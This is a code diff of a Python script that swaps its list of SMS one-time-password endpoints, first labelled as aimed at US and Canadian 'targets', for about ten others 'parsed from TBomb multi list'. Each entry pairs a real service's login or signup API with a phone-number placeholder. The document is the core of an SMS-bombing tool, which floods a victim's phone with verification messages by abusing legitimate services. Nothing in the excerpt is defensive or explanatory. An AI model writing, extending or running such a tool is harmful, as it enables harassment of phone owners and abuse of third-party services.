@@ -5,13 +5,18 @@ import urllib.parse
 from urllib.error import URLError, HTTPError
 import asyncio
 
-# OTP endpoints for +1 (USA/Canada) targets
+# OTP endpoints parsed from TBomb multi list
 ENDPOINTS = [
-    {"url": "https://api.pizzahut.com/v1/user/otp", "method": "POST", "payload": {"phone": "{TARGET}"}},
-    {"url": "https://www.doordash.com/api/v1/auth/query_phone", "method": "POST", "payload": {"phone_number": "{TARGET}"}},
-    {"url": "https://api.grubhub.com/auth/login/otp", "method": "POST", "payload": {"phone": "{TARGET}"}},
-    {"url": "https://auth.uber.com/api/get-otp", "method": "POST", "payload": {"phoneNumber": "{TARGET}"}},
-    {"url": "https://m.lyft.com/api/otp/send", "method": "POST", "payload": {"phone": "{TARGET}"}}
+    {"url": "https://www.flipkart.com/api/5/user/otp/generate", "method": "POST", "payload": {"loginId": "+{TARGET}"}},
+    {"url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", "method": "POST", "payload": {"phone": "1{TARGET}"}},
+    {"url": "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en", "method": "POST", "payload": {"phone_number": "1{TARGET}"}},
+    {"url": "https://youla.ru/web-api/auth/request_code", "method": "POST", "payload": {"phone": "+1{TARGET}"}},
+    {"url": "https://api.ivi.ru/mobileapi/user/register/phone/v6", "method": "POST", "payload": {"phone": "1{TARGET}"}},
+    {"url": "https://api.delitime.ru/api/v2/signup", "method": "POST", "payload": {"SignupForm[username]": "1{TARGET}", "SignupForm[device_type]": "3"}},
+    {"url": "https://www.icq.com/smsreg/requestPhoneValidation.php", "method": "POST", "payload": {"msisdn": "1{TARGET}", "locale": "en", "k": "ic1rtwz1s1Hj1O0r", "r": "45559"}},
+    {"url": "https://api.ivi.ru/mobileapi/user/register/phone/v6/", "method": "POST", "payload": {"phone": "1{TARGET}", "device": "Windows+v.43+Chrome+v.7453451", "app_version": "870"}},
+    {"url": "https://m.redbus.in/api/getOtp?number={TARGET}&cc=1&whatsAppOpted=false", "method": "GET", "payload": None},
+    {"url": "https://my.newtonschool.co:443/api/v1/user/otp/?registration=true", "method": "POST", "payload": {"phone": "+1{TARGET}"}}
 ]
 
 import random
